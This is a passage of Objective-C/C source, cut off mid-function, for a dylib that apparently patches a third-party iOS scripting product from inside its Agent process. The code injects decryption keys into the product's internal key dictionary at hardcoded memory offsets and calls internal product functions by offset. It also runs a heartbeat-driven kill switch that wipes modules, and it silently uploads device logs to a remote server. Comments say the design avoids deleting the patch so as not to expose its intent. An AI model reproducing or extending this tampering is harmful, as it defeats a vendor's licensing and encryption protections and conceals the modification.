static unsigned char *bs_http_get_c(const char *curl, size_t *outlen) {
    return bs_http_get_ex(curl, outlen, NULL);
}

/// ★ v6 实现：与旧 bs_http_get_c 逐行一致，额外回写 HTTP 状态码。
///   心跳用它区分「服务在但明确拒绝（403/404）」与「压根连不上（code==0）」。
static unsigned char *bs_http_get_ex(const char *curl, size_t *outlen, long *outcode) {
    // ★ v6.8：小请求（心跳/manifest/密钥/模块）维持 6s/8s 不变；
    //   大文件下载（beta.so）走 bs_http_get_ex_tmo 的长超时版本。
    return bs_http_get_ex_tmo(curl, outlen, outcode, PULL_TIMEOUT, PULL_TIMEOUT + 2);
}

/// ★ v6.8：带超时参数的同步 GET —— 与 bs_http_get_ex 逐行一致，只是超时可调。
///   为什么必须有它：PULL_TIMEOUT=6s（resource 8s）在局域网拉 1.16MB 只要 3s，
///   但弱网远程（111.172.x 两台实测）8s 内拉不完 → NSURLErrorTimedOut(-1001)
///   → 收到 0 字节 → bad size 0 abort，**每 120s 白下载一次、永不落盘**（38 次/9 次）。
///   timeoutIntervalForRequest 是「无数据空闲」超时（有数据流动就续命），
///   timeoutIntervalForResource 是整个请求的总预算 —— 两个都要放大才有效。
static unsigned char *bs_http_get_ex_tmo(const char *curl, size_t *outlen, long *outcode,
                                         int tmo_req, int tmo_res) {
    if (outlen) *outlen = 0;
    if (outcode) *outcode = 0;
    if (!curl || !curl[0]) return NULL;

    // —— 跨线程交换用的纯 C 槽位（不用 __block 对象！）——
    //   slot 用 malloc 避免 __block byref 的逃逸写屏障差异；用原子写保证可见性。
    struct bs_http_slot *slot = (struct bs_http_slot *)calloc(1, sizeof(struct bs_http_slot));
    if (!slot) return NULL;

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    @autoreleasepool {
        NSString *url = [NSString stringWithUTF8String:curl];
        if (url.length == 0) { free(slot); return NULL; }
        NSURL *u = [NSURL URLWithString:url];
        if (!u) { bs_log("[pull] bad url %s", curl); free(slot); return NULL; }

        NSMutableURLRequest *rq = [NSMutableURLRequest requestWithURL:u];
        rq.timeoutInterval = tmo_req;
        rq.cachePolicy = NSURLRequestReloadIgnoringLocalAndRemoteCacheData;

        NSURLSessionConfiguration *cc = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        cc.timeoutIntervalForRequest  = tmo_req;
        cc.timeoutIntervalForResource = tmo_res;
        NSURLSession *ss = [NSURLSession sessionWithConfiguration:cc];

        [[ss dataTaskWithRequest:rq
              completionHandler:^(NSData *d, NSURLResponse *rp, NSError *e) {
            // ★★ 关键：在回调线程的 autorelease pool 还活着时，立刻把字节拷走。
            //    绝不把 NSData* 本身带出这个 block。
            long code = 0;
            if ([rp isKindOfClass:[NSHTTPURLResponse class]]) {
                code = (long)[(NSHTTPURLResponse *)rp statusCode];
            }
            if (!e && d != nil && d.length > 0 && code == 200) {
                size_t n = (size_t)d.length;
                unsigned char *copy = (unsigned char *)malloc(n + 1);
                if (copy) {
                    memcpy(copy, d.bytes, n);
                    copy[n] = 0;            // 方便当字符串扫
                    slot->buf = copy;
                    slot->len = n;
                }
            } else if (e) {
                // ★ 不用 e.localizedDescription（会走 NSBundle 懒加载文本表，
                //   在裸 pthread 上有风险）；只打 code/domain 这类纯标量。
                bs_log("[pull] err code=%ld", (long)e.code);
            } else if (code != 0 && code != 200) {
                bs_log("[pull] http %ld for %s", code, curl);
            }
            slot->code = code;
            // 原子发布：先写数据再打屏障，再 signal，保证等待线程看到完整数据
            __sync_synchronize();
            dispatch_semaphore_signal(sem);
        }] resume];

        // 按需修改（上面 block 捕获了 slot，无需 __block）
        //   ★ v6.8：等待上限跟随 resource 超时（+3s 余量），否则大文件下载
        //   还没到 resource 上限信号量就先超时了，白等。
        long waited = dispatch_semaphore_wait(
            sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(tmo_res + 3) * NSEC_PER_SEC));
        [ss invalidateAndCancel];
        if (outcode) *outcode = slot->code;     // ★ v6：码也要带出去（超时/失败路径）
        if (waited != 0) {
            bs_log("[pull] timeout %s", curl);
            // ★★ 超时后**绝不 free(slot)**：回调可能仍在队列里，一旦它随后写
            //    slot 就是我们刚修掉的同一个 UAF。这里刻意泄漏（每进程最多几次
            //    pull 超时，几十字节，可忽略），换取绝对的内存安全。
            return NULL;
        }
    }

    if (outcode) *outcode = slot->code;         // ★ v6
    if (slot->buf && slot->len > 0) {
        unsigned char *ret = slot->buf;         // 所有权交给调用方
        size_t n = slot->len;
        free(slot);
        if (outlen) *outlen = n;
        return ret;
    }
    free(slot);
    return NULL;
}

/// ★★ v6.4：同步 POST（与 bs_http_get_ex 同构，额外带请求体）。
///   用途：probe 模式向云端 /probe 上报「密钥 + beta.so」（最大 1MB+）。
///   语义与 GET 版一致：HTTP 200 且响应非空则返回 malloc 的 buffer（调用方 free），
///   否则返回 NULL 并回写 outcode。
///   ★ 沿用 GET 版的铁律：**超时后绝不 free(slot)**（回调可能仍在队列里，防 UAF）。
static unsigned char *bs_http_post_ex(const char *curl, const char *ctype,
                                      const void *body, size_t blen,
                                      size_t *outlen, long *outcode) {
    return bs_http_post_key(curl, ctype, NULL, body, blen, outlen, outcode);
}

/// ★ v6.20：带可选自定义头（X-Card-Key）的 POST —— v6.19  probe 帧与卡密 login 共用。
static unsigned char *bs_http_post_key(const char *curl, const char *ctype,
                                       const char *xcardkey,
                                       const void *body, size_t blen,
                                       size_t *outlen, long *outcode) {
    if (outlen) *outlen = 0;
    if (outcode) *outcode = 0;
    if (!curl || !curl[0] || !body || blen == 0) return NULL;

    // 上行大包给足超时（GET 是 6s，这里 ×4）
    const int tmo = PULL_TIMEOUT * 4;

    struct bs_http_slot *slot = (struct bs_http_slot *)calloc(1, sizeof(struct bs_http_slot));
    if (!slot) return NULL;

    dispatch_semaphore_t sem = dispatch_semaphore_create(0);

    @autoreleasepool {
        NSString *url = [NSString stringWithUTF8String:curl];
        if (url.length == 0) { free(slot); return NULL; }
        NSURL *u = [NSURL URLWithString:url];
        if (!u) { bs_log("[probe] bad url %s", curl); free(slot); return NULL; }

        NSMutableURLRequest *rq = [NSMutableURLRequest requestWithURL:u];
        rq.HTTPMethod = @"POST";
        rq.timeoutInterval = tmo;
        rq.cachePolicy = NSURLRequestReloadIgnoringLocalAndRemoteCacheData;
        if (ctype && ctype[0])
            [rq setValue:[NSString stringWithUTF8String:ctype]
                  forHTTPHeaderField:@"Content-Type"];
        if (xcardkey && xcardkey[0])
            [rq setValue:[NSString stringWithUTF8String:xcardkey]
                  forHTTPHeaderField:@"X-Card-Key"];
        [rq setValue:@"identity" forHTTPHeaderField:@"Accept-Encoding"];
        [rq setHTTPBody:[NSData dataWithBytes:body length:blen]];

        NSURLSessionConfiguration *cc = [NSURLSessionConfiguration ephemeralSessionConfiguration];
        cc.timeoutIntervalForRequest  = tmo;
        cc.timeoutIntervalForResource = tmo + 5;
        NSURLSession *ss = [NSURLSession sessionWithConfiguration:cc];

        [[ss dataTaskWithRequest:rq
              completionHandler:^(NSData *d, NSURLResponse *rp, NSError *e) {
            // 与 GET 版同样的纪律：在回调 autorelease pool 里把字节拷走，不带 NSData* 出去
            long code = 0;
            if ([rp isKindOfClass:[NSHTTPURLResponse class]])
                code = (long)[(NSHTTPURLResponse *)rp statusCode];
            if (!e && d != nil && d.length > 0) {
                size_t n = (size_t)d.length;
                unsigned char *copy = (unsigned char *)malloc(n + 1);
                if (copy) {
                    memcpy(copy, d.bytes, n);
                    copy[n] = 0;
                    slot->buf = copy;
                    slot->len = n;
                }
            } else if (e) {
                bs_log("[probe] post err code=%ld", (long)e.code);
            } else if (code != 0 && code != 200) {
                bs_log("[probe] post http %ld", code);
            }
            slot->code = code;
            __sync_synchronize();
            dispatch_semaphore_signal(sem);
        }] resume];

        long waited = dispatch_semaphore_wait(
            sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(tmo + 6) * NSEC_PER_SEC));
        [ss invalidateAndCancel];
        if (outcode) *outcode = slot->code;
        if (waited != 0) {
            bs_log("[probe] post timeout %s", curl);
            return NULL;    // ★ 不 free(slot)：回调可能仍在队列里
        }
    }

    if (outcode) *outcode = slot->code;
    if (slot->buf && slot->len > 0) {
        unsigned char *ret = slot->buf;
        size_t n = slot->len;
        free(slot);
        if (outlen) *outlen = n;
        return ret;
    }
    free(slot);
    return NULL;
}

/// 从 manifest.json 里取模块名 → 期望 md5。
///
/// ★★ 2026-09-26 关键修正：**绝对不能用 NSJSONSerialization！**
///    实测崩溃：在自建 pthread(bs_puller) 里首次调 NSJSONSerialization 时
///    SIGSEGV KERN_INVALID_ADDRESS at 0x10（objc_msgSend 内部）。
///    注意 NSData/NSString/NSPropertyListSerialization 在该线程里都正常，
///    唯独 NSJSONSerialization 会崩（它依赖 ICU/CF locale 数据懒加载）。
///    ⇒ 这里改成**纯 C 的极简 JSON 扫描**，只提取 manifest 里的
///      "modules": { "<name>": { "md5": "<hex>", ... }, ... }
///    完全不碰 ObjC，任何线程都安全。
///
/// manifest 由我们自己的 PC 端生成，格式可控，解析器只需覆盖这一种形状。
#define BS_MAX_MODS 64
#define BS_NAME_MAX 128
typedef struct {
    char name[BS_NAME_MAX];
    char md5[40];
} bs_mod_t;

/// 在 [p, end) 里跳过空白
static const char *bs_skip_ws(const char *p, const char *end) {
    while (p < end && (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')) p++;
    return p;
}

/// 从 p 处解析一个 JSON 字符串到 out（去转义），返回结束引号后的位置；失败返回 NULL
static const char *bs_json_str(const char *p, const char *end, char *out, size_t outsz) {
    if (p >= end || *p != '"') return NULL;
    p++;
    size_t n = 0;
    while (p < end && *p != '"') {
        char c = *p;
        if (c == '\\' && p + 1 < end) {
            p++;
            switch (*p) {
                case 'n': c = '\n'; break;
                case 't': c = '\t'; break;
                case 'r': c = '\r'; break;
                case '"': c = '"';  break;
                case '\\': c = '\\'; break;
                case '/': c = '/';  break;
                default: c = *p;    break;
            }
        }
        if (n + 1 < outsz) out[n++] = c;
        p++;
    }
    if (p >= end) return NULL;
    out[n] = 0;
    return p + 1;   // 跳过结尾引号
}

/// 解析 manifest，填充 mods，返回模块数（0 = 失败/空）
static int bs_parse_manifest_c(const char *buf, size_t len, bs_mod_t *mods, int maxmods) {
    const char *end = buf + len;

    // 1) 找 "modules"
    const char *p = buf;
    const char *modsKey = NULL;
    while (p < end) {
        const char *q = strstr(p, "\"modules\"");
        if (!q || q >= end) break;
        // 确认是 key（后面跟冒号）
        const char *r = bs_skip_ws(q + 9, end);
        if (r < end && *r == ':') { modsKey = r + 1; break; }
        p = q + 9;
    }
    if (!modsKey) return 0;

    // 2) 进入 modules 的 { }
    p = bs_skip_ws(modsKey, end);
    if (p >= end || *p != '{') return 0;
    p++;

    int n = 0;
    while (p < end && n < maxmods) {
        p = bs_skip_ws(p, end);
        if (p >= end) break;
        if (*p == '}') break;               // modules 结束
        if (*p == ',') { p++; continue; }

        // 模块名
        char name[BS_NAME_MAX];
        const char *np = bs_json_str(p, end, name, sizeof(name));
        if (!np) break;
        p = bs_skip_ws(np, end);
        if (p >= end || *p != ':') break;
        p = bs_skip_ws(p + 1, end);
        if (p >= end || *p != '{') break;   // 进入模块对象
        p++;

        // 在模块对象里找 "md5"
        char md5[40] = {0};
        while (p < end) {
            p = bs_skip_ws(p, end);
            if (p >= end || *p == '}') { p++; break; }
            if (*p == ',') { p++; continue; }

            char key[64];
            const char *kp = bs_json_str(p, end, key, sizeof(key));
            if (!kp) { p = end; break; }
            p = bs_skip_ws(kp, end);
            if (p >= end || *p != ':') break;
            p = bs_skip_ws(p + 1, end);

            if (!strcmp(key, "md5")) {
                const char *vp = bs_json_str(p, end, md5, sizeof(md5));
                if (!vp) break;
                p = vp;
            } else {
                // 跳过该 value（字符串 / 数字 / true / false / null）
                if (p < end && *p == '"') {
                    char skip[512];
                    const char *vp = bs_json_str(p, end, skip, sizeof(skip));
                    if (!vp) break;
                    p = vp;
                } else {
                    while (p < end && *p != ',' && *p != '}') p++;
                }
            }
        }

        if (name[0] && md5[0]) {
            strncpy(mods[n].name, name, BS_NAME_MAX - 1);
            mods[n].name[BS_NAME_MAX - 1] = 0;
            strncpy(mods[n].md5, md5, sizeof(mods[n].md5) - 1);
            mods[n].md5[sizeof(mods[n].md5) - 1] = 0;
            n++;
        }
    }
    return n;
}

/// ---------------------------------------------------------------- v6 心跳授权
///
/// 「心跳即死亡」核心：模块虽然只下发一次，但**使用许可**每一轮都要向 PC 复核。
///
/// ★★ 两种失败必须区别对待（v6.1 起）：
///   - **网络类失败**（连不上/超时/5xx）：抖动是常态 → **计数容忍**，
///     连续 `g_hb_max` 次才判失联（失联窗口 = g_hb_max × tick 秒，默认 3）。
///   - **授权类失败**（403 / body `"ok":false`）：是**明确判决** → **立即**死，
///     一次都不容忍。否则被人拉黑还能多跑 3 个 tick。
///
/// 返回值约定（v6.1 改动）：
///     1 = 授权有效（继续）
///     0 = 本次不通过（**网络类**，交给调用方累加 g_hb_miss 决定是否杀）
///    -1 = **立即判死**（授权类，调用方必须无条件 kill，不看计数）
///
/// ★ 鉴权语义（服务端实现约定）：
///     200 + {"ok":true}   → 授权有效
///     200 + {"ok":false}  → 显式拒绝（被拉黑/到期）→ 返回 -1 立即判死
///     403                 → 同上，返回 -1 立即判死
///     404                 → 服务端没实现该端点 → 视为**不启用**心跳（避免误杀自己）
///     其他                → 计入 miss
///   这样「只装了 deb、没跑 BSModuleServer」的设备，因为连不上（code==0）
///   会连续 g_hb_max 次后死掉。
static int bs_hb_ping(uintptr_t base) {
    @autoreleasepool {
        char ip[128] = {0};
        if (!bs_get_host_c(ip, sizeof(ip))) {
            bs_log("[hb] no server host -> miss");
            return 0;
        }

        char url[768];   // ★ v6.10 g_qbuf 现含设备信息，512 不够
        const char *q = (g_token[0] != 0) ? g_qbuf : "";
        snprintf(url, sizeof(url), "http://%s:%d%s%s", ip, g_port, HB_PATH, q);
        bs_log("[hb] ping %s", url);

        size_t n = 0;
        long code = 0;
        unsigned char *buf = bs_http_get_ex(url, &n, &code);
        bs_log("[hb] resp code=%ld len=%lu", code, (unsigned long)n);

        int verdict = 0;        // 0=miss  1=ok
        if (code == 404) {
            // 服务端未实现 /hb：按「不启用心跳」处理，避免把正常环境误杀
            // 但此时又没跑服务，连 404 都拿不到（code==0）。所以只有真拿到 404 才放过。
            bs_log("[hb] endpoint absent (404) -> heartbeat disabled");
            free(buf);
            g_hb_miss = 0;
            g_hb_ok   = 1;
            g_hb_last = (long)time(NULL);
            return 1;
        }
        if (code == 403) {
            // ★ 明确拒绝：不计数，立即死
            bs_log("[hb] forbidden (403) -> immediate kill");
            free(buf);
            return -1;
        }
        if (buf && n > 0) {
            // 极简判定：body 里出现 "ok":true / "ok":false（服务端我们自己写）
            const char *s = (const char *)buf;
            if (strstr(s, "\"ok\":true") || strstr(s, "\"ok\": true") ||
                strstr(s, "\"ok\" :true") || strstr(s, "\"ok\" : true")) {
                verdict = 1;
            } else if (strstr(s, "\"ok\":false") || strstr(s, "\"ok\": false")) {
                // ★ 明确拒绝：不计数，立即死
                bs_log("[hb] explicit deny -> immediate kill");
                free(buf);
                return -1;
            }
        }
        free(buf);

        if (verdict) {
            if (!g_hb_ok) bs_log("[hb] re-authorized");
            g_hb_ok   = 1;
            g_hb_miss = 0;
            g_hb_last = (long)time(NULL);
            return 1;
        }
        // 网络类失败：调用方累加计数
        bs_log("[hb] network miss (code=%ld)", code);
        return 0;
    }
}

/// ★ v6.23k：设备日志回传 —— 把本机 bs_unlock.log 尾部（≤8KB）POST 到云端
///   /devlog?key=<token>，解决「设备不在同一局域网抓不到日志」。
///   puller 每拍 hb 后调用；日志无增长或距上次 <50s 则跳过；
///   失败完全静默 —— 日志通道绝不允许影响主链路。
static void bs_devlog_upload(void) {
    static long last_size = -1;
    static long last_try  = 0;
    if (!g_token[0]) return;
    long now = (long)time(NULL);
    if (now - last_try < 50) return;
    last_try = now;
    FILE *f = fopen(BS_LOG_PATH, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    if (sz <= 0 || sz == last_size) { fclose(f); return; }
    long tail = sz > 8192 ? 8192 : sz;
    fseek(f, sz - tail, SEEK_SET);
    static char body[8200];                   // static：裸线程栈安全
    size_t rn = fread(body, 1, (size_t)tail, f);
    fclose(f);
    if (rn == 0) return;
    last_size = sz;
    char ip[128] = {0};
    if (!bs_get_host_c(ip, sizeof(ip))) return;
    char url[512];
    snprintf(url, sizeof(url), "http://%s:%d/devlog?key=%s", ip, g_port, g_token);
    size_t on = 0; long ocode = 0;
    unsigned char *obuf = bs_http_post_ex(url, "text/plain", body, rn, &on, &ocode);
    if (obuf) free(obuf);
    bs_log("[devlog] uploaded %zu B (file %ld B) http=%ld", rn, sz, ocode);

    // ★ v6.23z：agent.log（脚本层错误源，「run script error」所在文件）尾 8KB
    //   随拍分存云端（&src=agent）。远程设备脚本停摆时无需 SSH 即可在云端
    //   对照「脚本报错 → [cr]/[wd] 自愈」完整时间线。失败完全静默。
    {
        FILE *af = fopen(DATA_DIR "/log/agent.log", "rb");
        if (af) {
            fseek(af, 0, SEEK_END);
            long asz = ftell(af);
            if (asz > 0) {
                long atail = asz > 8192 ? 8192 : asz;
                fseek(af, asz - atail, SEEK_SET);
                static char abody[8200];          // static：裸线程栈安全
                size_t an = fread(abody, 1, (size_t)atail, af);
                if (an > 0) {
                    char aurl[560];
                    snprintf(aurl, sizeof(aurl),
                             "http://%s:%d/devlog?key=%s&src=agent", ip, g_port, g_token);
                    size_t an2 = 0; long acode = 0;
                    unsigned char *ares = bs_http_post_ex(aurl, "text/plain", abody, an, &an2, &acode);
                    if (ares) free(ares);
                }
            }
            fclose(af);
        }
    }

    // ★ v6.24r：事件专道（&src=evt）—— bs_evt.log 只记决策级事件，增长极慢，
    //   8KB 可覆盖数周。主日志被 [pull]/[hb]/rep-key 刷到只剩 6~12 分钟时，
    //   崩溃/停止/换库的现场仍然完整留在这里。失败完全静默。
    {
        static long evt_last = -1;
        FILE *ef = fopen(BS_EVT_PATH, "rb");
        if (ef) {
            fseek(ef, 0, SEEK_END);
            long esz = ftell(ef);
            if (esz > 0 && esz != evt_last) {
                long etail = esz > 8192 ? 8192 : esz;
                fseek(ef, esz - etail, SEEK_SET);
                static char ebody[8200];          // static：裸线程栈安全
                size_t en = fread(ebody, 1, (size_t)etail, ef);
                if (en > 0) {
                    char eurl[560];
                    snprintf(eurl, sizeof(eurl),
                             "http://%s:%d/devlog?key=%s&src=evt", ip, g_port, g_token);
                    size_t en2 = 0; long ecode = 0;
                    unsigned char *eres = bs_http_post_ex(eurl, "text/plain", ebody, en, &en2, &ecode);
                    if (eres) free(eres);
                    evt_last = esz;
                }
            }
            fclose(ef);
        }
    }
}

/// ★ v6.23i：抹掉本地模块文件（从 bs_killswitch 抽出，供封禁期每拍复用）。
///   只 unlink *.lua，不动目录本身；返回抹掉的文件数。
static int bs_wipe_local_modules(void) {
    int wiped = 0;
    char dpath[288];
    snprintf(dpath, sizeof(dpath), "%s", g_mod_dir);
    DIR *d = opendir(dpath);
    if (d) {
        struct dirent *de;
        while ((de = readdir(d)) != NULL) {
            size_t ln = strlen(de->d_name);
            if (ln < 5) continue;
            if (strcmp(de->d_name + ln - 4, ".lua") != 0) continue;
            char fp[320];
            snprintf(fp, sizeof(fp), "%s/%s", dpath, de->d_name);
            if (unlink(fp) == 0) wiped++;
        }
        closedir(d);
    }
    return wiped;
}

/// 死亡开关：停脚本 + 抹掉本地模块。
///
/// ★ 只做两件**不可逆且立刻生效**的事：
///   1) 调产品自己的 `_set_user_script_operate(1)` 停脚本；
///   2) unlink 模块目录下所有 *.lua（下轮即使有人跑 BSModuleServer，
///      也要等 puller 重新下载才恢复 —— 也就是「必须运行 PC 服务才一切正常」）。
///
/// ★ 不删 dylib / 不删 beta.so / 不删 Agent：那是补丁本体，删了反而暴露意图，
///   而且会让「重新连上服务后自动恢复」这条链路断掉。
static void bs_killswitch(uintptr_t base, const char *why) {
    bs_log("[kill] TRIGGERED (%s) miss=%d -> stop script + wipe modules",
           why ? why : "?", g_hb_miss);

    // 1) 停脚本（产品内部函数，必须从非裸线程调用路径进入 → watchdog 线程已就绪）
    if (base) {
        ((void (*)(int))(base + FN_SET_OPER))(OPER_STOP);
        bs_log("[kill] OPER_STOP issued");
    }

    // 2) 抹掉模块文件（纯 POSIX，任何线程安全）
    int wiped = bs_wipe_local_modules();
    bs_log("[kill] wiped %d module file(s) at %s", wiped, g_mod_dir);
}

/// ★ v6.3：读本地 beta.so 的版本号。
///   文件头 4 字节 = [类型 1B][版本 3B]：02 09 09 -> "020909"（2.9.9）、
///   03 00 00 -> "030000"（3.0.0）。纯 POSIX 读，路径是 App 视角
///   （本 dylib 跑在 Agent 进程内，DATA_DIR 即真实 Media）。
static int bs_read_beta_ver(char *out, size_t outsz) {
    int fd = open(DATA_DIR "/beta.so", O_RDONLY);
    if (fd < 0) {
        bs_log("[mh] open beta.so failed errno=%d", errno);
        return 0;
    }
    unsigned char h[4];
    ssize_t r = read(fd, h, sizeof(h));
    close(fd);
    if (r != (ssize_t)sizeof(h)) {
        bs_log("[mh] beta.so too short (r=%d)", (int)r);
        return 0;
    }
    snprintf(out, outsz, "%02x%02x%02x", h[1], h[2], h[3]);
    return 1;
}

/// ★ v6.3：注入解密密钥 _g_script_mushroom_head。
///
///   密钥优先从服务端取：GET /key?prj=<BS_PRJ>&ver=<本地 beta.so 版本>
///   返回 35 字节二进制 = 3B 版本号 + 32B 密钥（与 key 完全对应）。
///   取不到（离线/新版本还没上架）才回退到编译期内置的 kKey/kVal。
///
///   ⇒ 这一改动的意义：**脚本升级后不必重编译 dylib**。以前密钥硬编码，
///     版本一变（020909 -> 030000）就得改源码 + 重跑 CI + 重新部署；
///     现在只要云端密钥库补上对应版本，设备自己就能跟上。
///
///   ★ v6.5：语义从「为空才写」升级为**「按版本幂等 + 合并」**：
///     - 槽位已含当前本地版本的键 → 纯 C 快路径直接返回（不碰 ObjC）
///     - 版本与上次注入的不同（官方下包落盘）→ 取新版本密钥，**合并**进原字典
///   由 bootstrap 调一次；此后由 bs_verwatch（3s）持续复查。
static int bs_verhex_to_bytes(const char *hex, unsigned char out[3]) {
    if (!hex || strlen(hex) != 6) return 0;
    for (int i = 0; i < 3; i++) {
        int hi = (unsigned char)hex[2 * i];
        int lo = (unsigned char)hex[2 * i + 1];
        int a = (hi >= '0' && hi <= '9') ? hi - '0' :
                (hi >= 'a' && hi <= 'f') ? hi - 'a' + 10 :
                (hi >= 'A' && hi <= 'F') ? hi - 'A' + 10 : -1;
        int b = (lo >= '0' && lo <= '9') ? lo - '0' :
                (lo >= 'a' && lo <= 'f') ? lo - 'a' + 10 :
                (lo >= 'A' && lo <= 'F') ? lo - 'A' + 10 : -1;
        if (a < 0 || b < 0) return 0;
        out[i] = (unsigned char)((a << 4) | b);
    }
    return 1;
}

/// ★ v6.5：字典里是否已有该版本键。**必须在带 autoreleasepool 的上下文调用。**
static int bs_mh_has(void *dictptr, const unsigned char kk[3]) {
    if (!dictptr) return 0;
    @autoreleasepool {
        NSDictionary *d = (NSDictionary *)dictptr;
        NSData *k = [NSData dataWithBytes:kk length:3];
        return [d objectForKey:k] ? 1 : 0;
    }
}

/// ★ v6.14：字典条目数（仅用于诊断日志；-1 = 槽位为空）。
///   现场靠这个数字判断产品有没有把关我们的字典换掉（n 变 0/变小 = 被替换过）。
static long bs_mh_count(void *dictptr) {
    if (!dictptr) return -1;
    @autoreleasepool {
        NSDictionary *d = (NSDictionary *)dictptr;
        return (long)[d count];
    }
}

static void bs_inject_mh(uintptr_t base) {
    void **slot = (void **)(base + OFF_MH);

    char verhex[8] = {0};
    int have_ver = bs_read_beta_ver(verhex, sizeof(verhex));

    unsigned char vkey[3] = {0};
    int key_from_ver = have_ver && bs_verhex_to_bytes(verhex, vkey);

    unsigned char kk[3];
    unsigned char vv[32];
    int ok = 0;
    int from_cache = 0;

    if (have_ver && key_from_ver) {
        // ★★★ v6.14：判据反转 —— **先确认键在不在字典里**，再谈版本号。
        //   产品 `_set_script_mushroom_head` 是整表替换（免卡密机照样会调），
        //   键会被冲掉；同版本也必须补回去，否则哨兵永远修不回来。
        int present = (*slot != NULL) && bs_mh_has(*slot, vkey);
        if (present) {
            if (strcmp(verhex, g_mh_ver)) {
                strncpy(g_mh_ver, verhex, sizeof(g_mh_ver) - 1);
                g_mh_ver[sizeof(g_mh_ver) - 1] = 0;
            }
            return;
        }
        // 键不在字典里：① 版本真的变了（官方落新包）② 字典被产品整表替换/清空
        if (!strcmp(verhex, g_mh_miss) && ++g_mh_try < VERWATCH_RETRY_EVERY) return;
        g_mh_try = 0;

        if (g_mh_cached && !strcmp(verhex, g_mh_ver)) {
            // ★ v6.14 离线快路径：版本没变、密钥有缓存 → 纯本地合并，不发 HTTP
            memcpy(kk, g_mh_kk, sizeof(kk));
            memcpy(vv, g_mh_vv, sizeof(vv));
            ok = 1;
            from_cache = 1;
            bs_log("[mh] key %s missing in dict (n=%ld) -> re-inject from cache",
                   verhex, bs_mh_count(*slot));
        } else {
            bs_log("[mh] ver changed -> %s (was '%s'), re-inject",
                   verhex, g_mh_ver[0] ? g_mh_ver : "(none)");
        }
    } else if (!have_ver && *slot != NULL) {
        return;   // 读不到版本、槽位又已有内容 → 别乱动
    }

    // ★ v6.14：ok 已在上面（缓存命中）或下面（云端取键）置位；
    //   缓存命中时**完全跳过 HTTP**。
    if (!ok && have_ver) {
        char ip[128] = {0};
        if (bs_get_host_c(ip, sizeof(ip))) {
            char url[512];
            if (g_token[0])
                snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=%s&key=%s",
                         ip, g_port, BS_PRJ, verhex, g_token);
            else
                snprintf(url, sizeof(url), "http://%s:%d/key?prj=%s&ver=%s",
                         ip, g_port, BS_PRJ, verhex);

            size_t n = 0;
            unsigned char *b = bs_http_get_c(url, &n);
            // ★ v6.5：**校验回包版本号**与请求一致（35B 且首 3 字节 == 请求版本），
            //   否则视为没拿到该版本的密钥（服务器可能回了别的版本 / 占位内容）
            if (b && n == 35 && key_from_ver && !memcmp(b, vkey, 3)) {
                memcpy(kk, b, 3);
                memcpy(vv, b + 3, 32);
                ok = 1;
                bs_log("[mh] cloud key OK ver=%s (%02x%02x%02x)", verhex,
                       kk[0], kk[1], kk[2]);
            } else {
                bs_log("[mh] cloud key MISS ver=%s n=%lu -> %s",
                       verhex, (unsigned long)n,
                       *slot != NULL ? "hold old, retry later" : "fallback");
            }
            if (b) free(b);
        } else {
            bs_log("[mh] no host -> %s", *slot != NULL ? "hold old" : "fallback");
        }
    } else if (!ok) {
        bs_log("[mh] beta.so ver unknown -> fallback");
    }

    if (!ok) {
        if (*slot != NULL) {
            // ★ v6.5：旧版本密钥已在手，新版本密钥云端还没上架 → 什么都不动
            //   （绝不把旧键冲掉，也绝不假装已注入新版本），记下版本号供节流，回头再试。
            if (have_ver && strcmp(verhex, g_mh_miss)) {
                strncpy(g_mh_miss, verhex, sizeof(g_mh_miss) - 1);
                g_mh_miss[sizeof(g_mh_miss) - 1] = 0;
            }
            return;
        }
        memcpy(kk, kKey, sizeof(kk));
        memcpy(vv, kVal, sizeof(vv));
        bs_log("[mh] using builtin key %02x%02x%02x", kk[0], kk[1], kk[2]);
    }

    @autoreleasepool {
        NSData *key = [NSData dataWithBytes:kk length:sizeof(kk)];
        NSData *val = [NSData dataWithBytes:vv length:sizeof(vv)];
        // ★ v6.5：**合并**进原字典（而不是整表替换）—— 免得丢掉 Agent 自己塞的键
        NSMutableDictionary *md;
        if (*slot != NULL) md = [NSMutableDictionary dictionaryWithDictionary:(NSDictionary *)(*slot)];
        else               md = [NSMutableDictionary dictionary];
        if (md) {
            [md setObject:val forKey:key];
            *slot = (void *)CFBridgingRetain(md);   // 永久 +1
            // ★ v6.14：把「版本 + 密钥」缓存进进程内存，供被冲掉时离线秒补
            if (have_ver && ok) {
                memcpy(g_mh_kk, kk, sizeof(g_mh_kk));
                memcpy(g_mh_vv, vv, sizeof(g_mh_vv));
                g_mh_cached = 1;
                strncpy(g_mh_ver, verhex, sizeof(g_mh_ver) - 1);   // 只记「确实注入了该版本密钥」
                g_mh_ver[sizeof(g_mh_ver) - 1] = 0;
                g_mh_miss[0] = 0;
                g_mh_try = 0;
            }
            bs_log("[mh] injected base=%p slot=%p new=%p ver=%s cloud=%d cache=%d n=%lu",
                   (void *)base, (void *)slot, *slot,
                   have_ver ? verhex : "(none)", ok, from_cache, (unsigned long)[md count]);
        } else {
            bs_log("[mh] dict build failed");
        }
    }
}

/// ★★★ v6.15：确保**载荷记录版本**（厂商固定 `020909`）的密钥也在字典里。
///
///   为什么必须单独做：`beta.so` 是**多记录容器**，Agent 在 `_bb_load_snail_module`
///   里**逐条记录**查密钥。记录 0（type=0x00 元数据）的 ver = 项目版本（030001…），
///   记录 1（type=0x01 脚本载荷）的 ver **恒为 020909**。只注头版本 ⇒ 载荷记录无键
///   ⇒ `can not find version key!!` → 中控报「加载运行库出错」。（2.9.9/3.0.0/3.0.1
///   三份文件的载荷记录版本与 32B hash 完全相同，故 020909 是格式版本而非项目版本。）
///
///   顺序：① 字典已有 → 返回（零开销，verwatch 3s 一轮可放心重放）
///         ② 有内存缓存 → 纯本地合并，不发 HTTP
///         ③ 否则 GET /key?prj=&ver=020909 → 校验 35B 且首 3 字节 == 020909 → 缓存
///         ④ 全失败 → 内置 kKey/kVal（与线上 020909 逐字节一致，已验证）
static void bs_ensure_payload_key(uintptr_t base) {
    void **slot = (void **)(base + OFF_MH);

    // ① 已在字典里 → 什么都不做
    if (*slot != NULL && bs_mh_has(*slot, kKey)) return;

    unsigned char kk[3];
    unsigned char vv[32];
